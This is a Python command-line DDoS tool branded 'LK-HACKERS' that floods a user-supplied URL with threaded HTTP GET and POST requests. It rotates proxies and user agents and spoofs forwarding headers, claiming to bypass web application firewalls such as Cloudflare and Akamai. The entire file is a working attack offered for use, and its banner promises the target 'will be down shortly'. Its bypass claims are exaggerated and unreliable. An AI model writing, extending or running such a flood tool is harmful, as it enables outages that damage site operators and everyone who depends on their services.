import threading
import requests
import random
import sys
import os
import time
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# --- ASSETS & BYPASS DATA ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

# Default Working Proxies (Example List - For real power, use a fresh SOCKS5 list)
DEFAULT_PROXIES = [
    "http://185.199.229.156:80",
    "http://103.157.243.20:80",
    "http://45.142.194.11:80",
    "http://192.168.1.1:8080" # Replace these with active ones from proxy-list.download
]

def blink_banner():
    for i in range(6):
        sys.stdout.write("\r" + Fore.RED + Style.BRIGHT + "  ██╗     ██╗  ██╗  ██╗   ██╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ███████╗██████╗ ")
        sys.stdout.flush()
        time.sleep(0.4)
        sys.stdout.write("\r" + Fore.BLACK + "  ██╗     ██╗  ██╗  ██╗   ██╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ███████╗██████╗ ")
        sys.stdout.flush()
        time.sleep(0.4)
    print("\n" + Fore.RED + Style.BRIGHT + "             [ LK-HACKERS POWER FULL WAF BYPASS DDOS /CYBER BLACK LION ]")
    print(Fore.RED + "======================================================================================")

def attack(target, method, proxies):
    while True:
        try:
            ua = random.choice(USER_AGENTS)
            # WAF Bypass Headers
            headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            proxy_choice = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
            
            if method == "1": # HTTP Flood (Standard WAF)
                requests.get(target, headers=headers, proxies=proxy_choice, timeout=5)
            elif method == "2": # Slowloris-style (Resource Exhaustion)
                requests.post(target, data={"data": "X"*1000}, headers=headers, proxies=proxy_choice, timeout=5)
            elif method == "3": # Recursive Bypass (Cloudflare/Akamai)
                requests.get(target + "/?q=" + str(random.randint(1,9999)), headers=headers, proxies=proxy_choice, timeout=5)
                
            print(Fore.RED + f"[!] WAF Bypassed -> Packet Sent to {target} | Status: CRASHING...")
        except:
            pass

def main():
    os.system('clear')
    blink_banner()
    
    print(Fore.YELLOW + "\n[+] Target URL (e.g., http://example.com): ")
    target = input(Fore.WHITE + ">> ")
    if not target.startswith("http"):
        print(Fore.RED + "[-] Error: Please include http:// or https://")
        sys.exit()

    print(Fore.YELLOW + "\n[+] Select WAF Type: ")
    print(Fore.WHITE + "1. Standard WAF / ModSecurity")
    print(Fore.WHITE + "2. Server Resource Exhaustion (Heavy)")
    print(Fore.WHITE + "3. Cloudflare / Akamai / High-Level Bypass")
    waf_choice = input(Fore.YELLOW + ">> ")

    print(Fore.YELLOW + "\n[+] Proxy Setup: ")
    print(Fore.WHITE + "1. Use LK-HACKERS Default Proxies")
    print(Fore.WHITE + "2. Use Custom Proxy List (Enter manually)")
    print(Fore.WHITE + "3. No Proxy (Direct Attack - High Risk)")
    proxy_choice = input(Fore.YELLOW + ">> ")
    
    final_proxies = []
    if proxy_choice == "1":
        final_proxies = DEFAULT_PROXIES
    elif proxy_choice == "2":
        print(Fore.WHITE + "Enter proxies separated by commas (e.g., http://ip:port,http://ip:port): ")
        p_input = input(Fore.YELLOW + ">> ")
        final_proxies = p_input.split(",")

    print(Fore.YELLOW + "\n[+] Enter Number of Threads (Power Level): ")
    try:
        thread_count = int(input(Fore.WHITE + ">> "))
    except ValueError:
        thread_count = 500

    print(Fore.GREEN + f"\n[+] Initializing WAF Bypass on {target}...")
    print(Fore.RED + "[!] Engaging God Mode... Target will be down shortly!")
    time.sleep(2)

    for i in range(thread_count):
        t = threading.Thread(target=attack, args=(target, waf_choice, final_proxies))
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()

